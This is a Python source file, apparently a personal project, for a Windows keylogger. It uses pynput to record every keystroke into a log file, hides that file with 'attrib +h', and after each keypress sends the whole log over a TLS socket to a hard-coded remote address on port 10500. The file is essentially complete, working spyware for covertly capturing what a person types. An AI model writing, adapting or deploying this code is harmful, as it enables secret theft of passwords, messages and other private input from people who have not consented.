import socket
import ssl
import os
from pynput.keyboard import Key, Listener
import logging
import platform
import time

def check_platform():
    return platform.system()


def find_ca_cert_path():
    for r, d, f in os.walk("c:\\"): 
        for files in f:
            if files == "ca-cert.pem":
                path = os.path.join(r, files)
                if path.endswith("SSL\\CA\\ca-cert.pem"):
                    return path  
    return None 
    
def os_check():
        current_platform = check_platform()
        if current_platform == 'Windows':
            #print('Windows')
            return 'Windows'
        elif current_platform == 'Linux':
            #print('Linux')
            return 'Linux'   
        else:
            return None

def send_file_content(client_ssl, file_path):
    with open(file_path, "r") as file:
        file_content = file.read()
        client_ssl.send(file_content.encode())

def key_logger(path_hidden_file, client_ssl):
    logging.basicConfig(filename=path_hidden_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")
    
    os.system(f"attrib +h {path_hidden_file}") #make the file hidden

    def on_press(key):
        logging.info(str(key))
        send_file_content(client_ssl, path_hidden_file)
 
    # Crée un écouteur de clavier pour enregistrer les touches
    with Listener(on_press=on_press) as listener:
        listener.join()

def main():
    print('main active')
    os_local = os_check()
    print(os_local)
    if os_local == 'Windows':
        
        ca_cert_path = find_ca_cert_path()
        print(ca_cert_path)
        script_dir = os.path.dirname(os.path.realpath(__file__))
        #ca_cert_path = os.path.abspath(os.path.join(script_dir, "..", "..","SSL", "CA", "ca-cert.pem"))
        # ca_cert_path = "C:/Users/rrais/Desktop/Dev/Python_Scripting/SSL/CA/ca-cert.pem" # take this path when you run it on .exe
        print("CA cert path:", ca_cert_path)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.load_verify_locations(cafile=ca_cert_path)

        # Setting
        host = '10.56.182.51'
        port = 10500
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Secure the socket
        client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
        client_ssl.connect((host, port))
    #bien ou quoi
        while True:
            try:
                key_logger("its_a_trap.txt", client_ssl)
                
            except Exception as e:
                print(f"Error: {e}")
                break

        print("-- END --")
        client_ssl.close()
    else : 
        print("linux in maintenance")

if __name__ == "__main__":
    main()
